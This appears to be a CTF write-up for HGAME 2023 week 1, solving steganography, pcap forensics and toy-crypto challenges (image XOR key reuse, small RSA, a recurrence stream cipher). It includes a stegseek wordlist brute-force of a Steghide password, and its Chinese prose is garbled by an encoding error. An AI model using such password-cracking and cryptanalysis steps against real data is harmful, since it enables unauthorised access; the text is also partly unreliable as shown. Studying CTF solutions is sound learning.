çº¿ä¸Šèµ›åˆ†ä¸ºå››å‘¨ï¼Œæ¯å‘¨è‡³å®˜æ–¹wpå‘å¸ƒå‰å‰ç¦æ­¢ä¸€åˆ‡è®¨è®ºæœ¬å‘¨é¢˜ç›®ä»¥åŠå…¬å¼€è‡ªå·± wp çš„è¡Œä¸ºã€‚åœ¨æ”¶é›†å®Œæˆåä¼šå¼€æ”¾è®¨è®ºï¼Œä½†ä»…èƒ½è®¨è®ºå·²ç»“æŸçš„é¢˜ç›®ã€‚<br>* æ¯å‘¨æ¯”èµ›ç»“æŸåæœ¬å‘¨å‰20åéœ€æäº¤wpåˆ°æŒ‡å®šé‚®ç®±<br>æœ¬æ¯”èµ›æœ€ç»ˆè§£é‡Šæƒå½’ Vidar-Team æ‰€æœ‰</p><p><strong>Rank: 1</strong></p><hr><p>â€‹    </p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Sign-In"><a href="#Sign-In" class="headerlink" title="Sign In"></a>Sign In</h3><blockquote><p>æ¬¢è¿å‚åŠ HGAME2023,Base64è§£ç è¿™æ®µFlagï¼Œç„¶åå’Œå…”å…”ä¸€èµ·å¼€å§‹ä½ çš„HGAMEä¹‹æ—…å§ï¼Œç¥ä½ ç©çš„æ„‰å¿«ï¼</p><p>aGdhbWV7V2VsY29tZV9Ub19IR0FNRTIwMjMhfQ==</p></blockquote><p>ç­¾åˆ°ï¼Œbase64è§£ç ï¼Œflagï¼š<code>hgame&#123;Welcome_To_HGAME2023!&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="Where-am-I"><a href="#Where-am-I" class="headerlink" title="Where am I"></a>Where am I</h3><blockquote><p>å…”å…”å›å®¶ä¹‹å‰å»äº†ä¸€ä¸ªç¥ç§˜çš„åœ°æ–¹ï¼Œå¹¶æ‹äº†å¼ ç…§ä¸Šä¼ åˆ°ç½‘ç›˜ï¼Œä½ çŸ¥é“ä»–å»äº†å“ªé‡Œå—ï¼Ÿ</p><p>flagæ ¼å¼ä¸º: <code>hgame&#123;ç»åº¦æ—¶_ç»åº¦åˆ†_ç»åº¦ç§’_ä¸œç»(E)/è¥¿ç»(W)_çº¬åº¦æ—¶_çº¬åº¦åˆ†_çº¬åº¦ç§’_å—çº¬(S)/åŒ—çº¬(N)&#125;</code>ï¼Œç§’ç²¾ç¡®åˆ°å°æ•°ç‚¹åä¸¤ä½</p><p>ä¾‹å¦‚: 11Â°22â€™33.99â€™â€™E, 44Â°55â€™11.00â€™â€™S è¡¨ç¤ºä¸º hgame{11_22_3399_E_44_55_1100_S}</p></blockquote><p>wiresharkæ‰“å¼€æµé‡æ–‡ä»¶ï¼Œåœ¨TCPæµ15æå–raræ–‡ä»¶ï¼›</p><p>16è¿›åˆ¶ä¸‹æŸ¥çœ‹raræ–‡ä»¶ï¼ŒæŸ¥çœ‹ç¬¬24ä¸ª16è¿›åˆ¶æ•°ä¸º<code>24</code>ï¼Œä¿®æ”¹ä¸º <code>20</code> å»é™¤ä¼ªåŠ å¯†ï¼Œè§£å‹å¾—åˆ° <code>Exchangeable.jpg</code>ï¼›</p><p>æŸ¥çœ‹jpgæ–‡ä»¶å±æ€§ï¼Œå‘ç°GPSç»çº¬åº¦ä¿¡æ¯ï¼Œæå–ç»çº¬åº¦æ•°æ®æŒ‰æ ¼å¼å¾—åˆ°flagï¼š<code>hgame&#123;116_24_1488_E_39_54_5418_N&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="ç¥ç§˜çš„æµ·æŠ¥"><a href="#ç¥ç§˜çš„æµ·æŠ¥" class="headerlink" title="ç¥ç§˜çš„æµ·æŠ¥"></a>ç¥ç§˜çš„æµ·æŠ¥</h3><blockquote><p>åè½¦å›åˆ°å®¶çš„å…”å…”å¬è¯´ek1ngåœ¨HGAMEçš„æµ·æŠ¥ä¸­éšè—äº†ä¸€ä¸ªç§˜å¯†â€¦â€¦ï¼ˆè¿˜è®°å¾—æˆ‘ä»¬çš„MiscåŸ¹è®­å—ï¼Ÿ</p></blockquote><p>zstegæŸ¥çœ‹pngå›¾ç‰‡ï¼Œå‘ç°åœ¨ <code>b1,rgb,lsb,xy</code> å­˜åœ¨lsbéšå†™å†…å®¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Sure enough, you still remember what we talked about at that time! This is part of the secret: `hgame&#123;U_Kn0w_LSB&amp;W`</span><br><span class="line">I put the rest of the content here, https://drive.google.com/file/d/13kBos3Ixlfwkf3e0z0kJTEqBxm7RUk-G/view?usp=sharing, if you directly access the google drive cloud disk download in China, it will be very slow, you can try to use Scientific Internet access solves the problem of slow or inaccessible access to external network resources. This is my favorite music, there is another part of the secret in the music, I use Steghide to encrypt, the password is also the 6-digit password we agreed at the time, even if someone else finds out here, it should not be so easy to crack (( hope so</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flagå‰åŠéƒ¨åˆ† <code>hgame&#123;U_Kn0w_LSB&amp;W</code>ã€‚</p><p>åˆ°googleäº‘ç›˜ä¸‹è½½ <code>Bossanova.wav</code> æ–‡ä»¶ï¼Œæ ¹æ®ä¸Šé¢æ–‡å­—æç¤º <code>I use Steghide to encrypt, the password is also the 6-digit password</code>ï¼Œä½¿ç”¨äº† <code>Steghide</code> å·¥å…·ç”¨6ä½æ•°å­—å¯†ç éšå†™ä¿¡æ¯ï¼Œçˆ†ç ´å¯†ç æå–ä¿¡æ¯ï¼š</p><p><code>stegseek Bossanova.wav rockyou.txt</code></p><p>è§£å‡ºå¯†ç ä¸º <code>123456</code>ï¼Œéšå†™å†…å®¹ï¼š<code>æ­å–œä½ è§£åˆ°è¿™é‡Œï¼Œå‰©ä¸‹çš„Flagæ˜¯ av^Mp3_Stego&#125;ï¼Œæˆ‘ä»¬Week2è§ï¼</code></p><p>flagï¼š<code>hgame&#123;U_Kn0w_LSB&amp;Wav^Mp3_Stego&#125;</code></p><p>â€‹    </p><h3 id="e99p1ant-want-girlfriend"><a href="#e99p1ant-want-girlfriend" class="headerlink" title="e99p1ant_want_girlfriend"></a>e99p1ant_want_girlfriend</h3><blockquote><p>å…”å…”åœ¨æŠ¢ç¥¨ç½‘ç«™ä¸Šçœ‹åˆ°äº†ä¸€åˆ™ç›¸äº²å¹¿å‘Šï¼Œäººè¿˜æœ‰ç‚¹å°å¸…ï¼Œä½†è¿™ä¸ªå›¾ç‰‡ä¼¼ä¹æœ‰ç‚¹é—®é¢˜ï¼Œå¥½åƒæ˜¯CRCæ ¡éªŒä¸å¤ªæ­£ç¡®ï¼Ÿ</p></blockquote><p>16è¿›åˆ¶ä¸‹ä¿®æ”¹pngå›¾ç‰‡çš„é«˜ä¸ºæ›´å¤§çš„å€¼ï¼Œå‘ç°flagï¼š<code>hgame&#123;e99p1ant_want_a_girlfriend_qq_524306184&#125;</code>ã€‚</p><p>â€‹    </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="å…”å…”çš„è½¦ç¥¨"><a href="#å…”å…”çš„è½¦ç¥¨" class="headerlink" title="å…”å…”çš„è½¦ç¥¨"></a>å…”å…”çš„è½¦ç¥¨</h3><blockquote><p>å…”å…”åˆšä¹°åˆ°è½¦ç¥¨å°±æŠŠè½¦ç¥¨ä¸¢åˆ°ä¸€æ—ï¼Œè‡ªå·±å¿™å»äº†ã€‚ç»“æœå†å»æ‰¾è½¦ç¥¨æ—¶å‘ç°åŸæ¥çš„è½¦ç¥¨æ··åœ¨äº†å…¶ä»–ä¸œè¥¿é‡Œï¼Œè€Œä¸”ç¥¨é¢è¿˜è¢«æ±¡æŸ“äº†ã€‚ä½ èƒ½å¸®å…”å…”æ‰¾åˆ°å®ƒçš„è½¦ç¥¨å—ã€‚</p><p>æ³¨ï¼šflag.pngå·²ç»æå‰ä¿å­˜åœ¨sourceæ–‡ä»¶å¤¹ä¸‹ï¼Œå¹¶ä¸”å‘½åä¸ºpicture{x}.png</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> shuffle, randint, getrandbits</span><br><span class="line"></span><br><span class="line">flagImg = Image.<span class="built_in">open</span>(<span class="string">&#x27;flag.png&#x27;</span>)</span><br><span class="line">width = flagImg.width</span><br><span class="line">height = flagImg.height</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">makeSourceImg</span>():</span><br><span class="line">    colors = long_to_bytes(getrandbits(width * height * <span class="number">24</span>))[::-<span class="number">1</span>]</span><br><span class="line">    img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, height))</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            img.putpixel((j, i), (colors[x], colors[x + <span class="number">1</span>], colors[x + <span class="number">2</span>]))</span><br><span class="line">            x += <span class="number">3</span></span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xorImg</span>(<span class="params">keyImg, sourceImg</span>):</span><br><span class="line">    img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, height))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            p1, p2 = keyImg.getpixel((j, i)), sourceImg.getpixel((j, i))</span><br><span class="line">            img.putpixel((j, i), <span class="built_in">tuple</span>([(p1[k] ^ p2[k]) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]))</span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">sourceæ–‡ä»¶å¤¹ä¸‹é¢çš„å›¾ç‰‡ç”Ÿæˆè¿‡ç¨‹ï¼š</span></span><br><span class="line"><span class="string">def makeImg():</span></span><br><span class="line"><span class="string">    colors = list(long_to_bytes(getrandbits(width * height * 23)).zfill(width * height * 24))</span></span><br><span class="line"><span class="string">    shuffle(colors)</span></span><br><span class="line"><span class="string">    colors = bytes(colors)</span></span><br><span class="line"><span class="string">    img = Image.new(&#x27;RGB&#x27;, (width, height))</span></span><br><span class="line"><span class="string">    x = 0</span></span><br><span class="line"><span class="string">    for i in range(height):</span></span><br><span class="line"><span class="string">        for j in range(width):</span></span><br><span class="line"><span class="string">            img.putpixel((j, i), (colors[x], colors[x + 1], colors[x + 2]))</span></span><br><span class="line"><span class="string">            x += 3</span></span><br><span class="line"><span class="string">    return img</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for i in range(15):</span></span><br><span class="line"><span class="string">    im = makeImg()</span></span><br><span class="line"><span class="string">    im.save(f&quot;./source/picture&#123;i&#125;.png&quot;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">n1 = makeSourceImg()</span><br><span class="line">n2 = makeSourceImg()</span><br><span class="line">n3 = makeSourceImg()</span><br><span class="line">nonce = [n1, n2, n3]</span><br><span class="line"></span><br><span class="line">index = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">16</span>))</span><br><span class="line">shuffle(index)</span><br><span class="line">e=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">è¿™é‡Œflag.pngå·²ç»æå‰è¢«ä¿å­˜åœ¨sourceæ–‡ä»¶å¤¹ä¸‹äº†ï¼Œæ–‡ä»¶åä¹Ÿæ˜¯picture&#123;xx&#125;.png</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> index:</span><br><span class="line">    im = Image.<span class="built_in">open</span>(<span class="string">f&quot;source/picture<span class="subst">&#123;i&#125;</span>.png&quot;</span>)</span><br><span class="line">    key = nonce[randint(<span class="number">0</span>, <span class="number">2</span>)]</span><br><span class="line">    encImg = xorImg(key, im)</span><br><span class="line">    encImg.save(<span class="string">f&#x27;pics/enc<span class="subst">&#123;e&#125;</span>.png&#x27;</span>)</span><br><span class="line">    e+=<span class="number">1</span></span><br></pre></td></tr></table></figure></blockquote><p>15å¼ éšæœºæ˜æ–‡å›¾ç‰‡ $P_{m_k},k \in [1,15]$ ä¸1å¼ flagå›¾ç‰‡ $P_f$ï¼Œç»è¿‡3å¼ å¯†é’¥å›¾ç‰‡  $P_k,k \in [1,3]$ éšæœºå¼‚æˆ–å¾—åˆ°å¯†æ–‡å›¾ç‰‡ $P_{c_k}, k \in [1,16]$ï¼Œåœ¨éšæœºç”Ÿæˆæ˜æ–‡å›¾ç‰‡çš„ <code>makeImg()</code> å‡½æ•°ä¸­æœ‰æ¦‚ç‡ç”Ÿæˆåƒç´ ä¸º (0,0,0) çš„ç‚¹ï¼Œè¿™äº›ç‚¹åœ¨éšæœºå¼‚æˆ–æ“ä½œåï¼Œå¯†æ–‡å›¾ç‰‡ä¸å¯†é’¥å›¾ç‰‡å¯¹åº”çš„è¯¥ç‚¹åƒç´ å€¼ç›¸åŒï¼Œåˆ™æœ‰ï¼š</p><p>flagå›¾ç‰‡å¯¹åº”çš„å¯†æ–‡å›¾ç‰‡ï¼š$P_{c_f}(x,y) = P_{f}(x,y) \oplus P_{k_a}(x,y)$</p><p>éflagéšæœºæ˜æ–‡å›¾ç‰‡å¯¹åº”çš„å¯†æ–‡å›¾ç‰‡ï¼š $P_{c_i}(x,y) = P_{m_i}(x,y) \oplus P_{k_b}(x,y)$ï¼Œ</p><p>å½“æ»¡è¶³ $a=b$ æ—¶ï¼Œå³æ‰¾åˆ°ä½¿ç”¨ç›¸åŒå¯†é’¥å›¾ç‰‡åŠ å¯†çš„ä¸¤ç»„åŸå§‹å›¾ç‰‡ï¼Œæœ‰ $P_{k_a}(x,y)=P_{k_b}(x,y)$ï¼Œ</p><p>åˆ™ $P_{c_f}(x,y) \oplus P_{c_i}(x,y) = P_{f}(x,y) \oplus P_{m_i}(x,y)$ï¼›</p><p>åˆæœ‰å¤§éƒ¨åˆ†éšæœºæ˜æ–‡å›¾ç‰‡çš„ç‚¹çš„åƒç´ å€¼ä¸º (0,0,0)ï¼Œå³ $P_{m_i}(x_0,y_0)=0$ï¼Œåˆ™</p><p>$P_{c_f}(x_0,y_0) \oplus P_{c_i}(x_0,y_0) = P_{f}(x_0,y_0) \oplus P_{m_i}(x_0,y_0)=P_{f}(x_0,y_0)$</p><p>æœ‰å¾ˆå¤§æ¦‚ç‡å¯ä»¥æ¢å¤flagå›¾ç‰‡ã€‚</p><p>åªéœ€æ‰¾åˆ°æ»¡è¶³ $a=b$ çš„ä½¿ç”¨ç›¸åŒå¯†é’¥å›¾ç‰‡åŠ å¯†çš„ä¸¤ç»„åŸå§‹å›¾ç‰‡å³å¯ï¼Œé€šè¿‡çˆ†ç ´éå†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">width = <span class="number">379</span></span><br><span class="line">height = <span class="number">234</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xorImg</span>(<span class="params">keyImg, sourceImg</span>):</span><br><span class="line">    img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, height))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            p1, p2 = keyImg.getpixel((j, i)), sourceImg.getpixel((j, i))</span><br><span class="line">            img.putpixel((j, i), <span class="built_in">tuple</span>([(p1[k] ^ p2[k]) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]))</span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        img1 = Image.<span class="built_in">open</span>(<span class="string">f&#x27;pics/enc<span class="subst">&#123;i&#125;</span>.png&#x27;</span>)</span><br><span class="line">        img2 = Image.<span class="built_in">open</span>(<span class="string">f&#x27;pics/enc<span class="subst">&#123;j&#125;</span>.png&#x27;</span>)</span><br><span class="line">        img = xorImg(img1, img2)</span><br><span class="line">        img.save(<span class="string">f&#x27;out/img_<span class="subst">&#123;i&#125;</span>_<span class="subst">&#123;j&#125;</span>.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°è¿˜åŸçš„flagå›¾ç‰‡ï¼Œflagï¼š<code>hgame&#123;Oh_my_Ticket&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><blockquote><p>ä¼—æ‰€å‘¨çŸ¥ï¼ŒRSAçš„å®‰å…¨æ€§åŸºäºæ•´æ•°åˆ†è§£éš¾é¢˜ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n=p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c=<span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n=<span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">c=110674792674017748243232351185896019660434718342001686906527789876264976328686134101972125493938434992787002915562500475480693297360867681000092725583284616353543422388489208114545007138606543678040798651836027433383282177081034151589935024292017207209056829250152219183518400364871109559825679273502274955582</span></span><br><span class="line"><span class="string">n=135127138348299757374196447062640858416920350098320099993115949719051354213545596643216739555453946196078110834726375475981791223069451364024181952818056802089567064926510294124594174478123216516600368334763849206942942824711531334239106807454086389211139153023662266125937481669520771879355089997671125020789</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></blockquote><p>$n$ åˆ†è§£å‡º $p,q$ï¼Œå¸¸è§„RSAã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">11239134987804993586763559028187245057652550219515201768644770733869088185320740938450178816138394844329723311433549899499795775655921261664087997097294813</span></span><br><span class="line">q = <span class="number">12022912661420941592569751731802639375088427463430162252113082619617837010913002515450223656942836378041122163833359097910935638423464006252814266959128953</span></span><br><span class="line">n = p*q</span><br><span class="line">c = <span class="number">110674792674017748243232351185896019660434718342001686906527789876264976328686134101972125493938434992787002915562500475480693297360867681000092725583284616353543422388489208114545007138606543678040798651836027433383282177081034151589935024292017207209056829250152219183518400364871109559825679273502274955582</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># hgame&#123;factordb.com_is_strong!&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="Be-Stream"><a href="#Be-Stream" class="headerlink" title="Be Stream"></a>Be Stream</h3><blockquote><p>å¾ˆå–œæ¬¢æå°é¾™å…ˆç”Ÿçš„ä¸€å¥è¯â€Be water my friendâ€ï¼Œä½†æ˜¯è¿™æ¡å°æºªçš„æ°´å¥½åƒå¤ªå¤šäº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">type</span>(flag) == <span class="built_in">bytes</span></span><br><span class="line"></span><br><span class="line">key = [<span class="built_in">int</span>.from_bytes(<span class="string">b&quot;Be water&quot;</span>, <span class="string">&#x27;big&#x27;</span>), <span class="built_in">int</span>.from_bytes(<span class="string">b&quot;my friend&quot;</span>, <span class="string">&#x27;big&#x27;</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stream</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> key[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">elif</span> i==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> key[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> (stream(i-<span class="number">2</span>)*<span class="number">7</span> + stream(i-<span class="number">1</span>)*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">enc = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    water = stream((i//<span class="number">2</span>)**<span class="number">6</span>) % <span class="number">256</span></span><br><span class="line">    enc += <span class="built_in">bytes</span>([water ^ flag[i]])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(enc)</span><br><span class="line"><span class="comment"># b&#x27;\x1a\x15\x05\t\x17\tu&quot;-\x06lm\x01-\xc7\xcc2\x1eXA\x1c\x15\xb7\xdb\x06\x13\xaf\xa1-\x0b\xd4\x91-\x06\x8b\xd4-\x1e\xab\xaa\x15-\xf0\xed\x1f\x17\x1bY&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>é€’æ¨å…³ç³»ç­‰åŒäºçŸ©é˜µè¿ç®—ï¼š</p><p>$s_i=4s_{i-1}+7s_{i-2}\Longrightarrow \begin{bmatrix} s_i \\ s_{i-1}  \end{bmatrix}=\begin{bmatrix} 4 &amp; 7 \\ 1 &amp; 0 \end{bmatrix}\begin{bmatrix} s_{i-1} \\ s_{i-2} \end{bmatrix}=\begin{bmatrix} 4 &amp; 7 \\ 1 &amp; 0 \end{bmatrix}^{i-1}\begin{bmatrix} s_1 \\ s_0 \end{bmatrix}$</p><p>åˆ©ç”¨çŸ©é˜µå¿«é€Ÿå¹‚å¿«é€Ÿæ±‚å€¼å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line">enc = <span class="built_in">list</span>(<span class="string">b&#x27;\x1a\x15\x05\t\x17\tu&quot;-\x06lm\x01-\xc7\xcc2\x1eXA\x1c\x15\xb7\xdb\x06\x13\xaf\xa1-\x0b\xd4\x91-\x06\x8b\xd4-\x1e\xab\xaa\x15-\xf0\xed\x1f\x17\x1bY&#x27;</span>)</span><br><span class="line">key = [<span class="built_in">int</span>.from_bytes(<span class="string">b&quot;Be water&quot;</span>, <span class="string">&#x27;big&#x27;</span>), <span class="built_in">int</span>.from_bytes(<span class="string">b&quot;my friend&quot;</span>, <span class="string">&#x27;big&#x27;</span>)]</span><br><span class="line">s0, s1 = key</span><br><span class="line"></span><br><span class="line">M = matrix(Zmod(<span class="number">256</span>), [[<span class="number">4</span>,<span class="number">7</span>],[<span class="number">1</span>,<span class="number">0</span>]])</span><br><span class="line">A = vector(Zmod(<span class="number">256</span>), [s1,s0])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stream</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> (M^(x-<span class="number">1</span>)*A)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    water = stream((i//<span class="number">2</span>)**<span class="number">6</span>)</span><br><span class="line">    flag += [(<span class="built_in">int</span>(water) ^^ <span class="built_in">int</span>(enc[i])) % <span class="number">128</span>]</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;1f_this_ch@l|eng3_take_y0u_to0_long_time?&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="ç¥ç§˜çš„ç”µè¯"><a href="#ç¥ç§˜çš„ç”µè¯" class="headerlink" title="ç¥ç§˜çš„ç”µè¯"></a>ç¥ç§˜çš„ç”µè¯</h3><blockquote><p>å­¦æ ¡çªç„¶æ”¾å‡äº†ï¼Œtr0ubleæ­£åœ¨å¼€å¼€å¿ƒå¿ƒçš„æ”¶æ‹¾ä¸œè¥¿å‡†å¤‡å›å®¶ï¼Œä½†æ˜¯æ‰‹æœºé“ƒå£°çªç„¶å“èµ·ï¼Œtr0ubleæ¥èµ·ç”µè¯ï¼Œä½†æ˜¯åªå¬åˆ°æ»´ç­”æ»´ç­”çš„å£°éŸ³ã€‚åŠªåŠ›å­¦ä¹ å¯†ç å­¦çš„tr0ubleä¸€å¬å°±çŸ¥é“è¿™æ˜¯ä»€ä¹ˆï¼Œäºæ˜¯é©¬ä¸Šè®°å½•ä¸‹æ¥å¹¶èŠ±äº†äº¿ç‚¹æ—¶é—´æˆåŠŸç 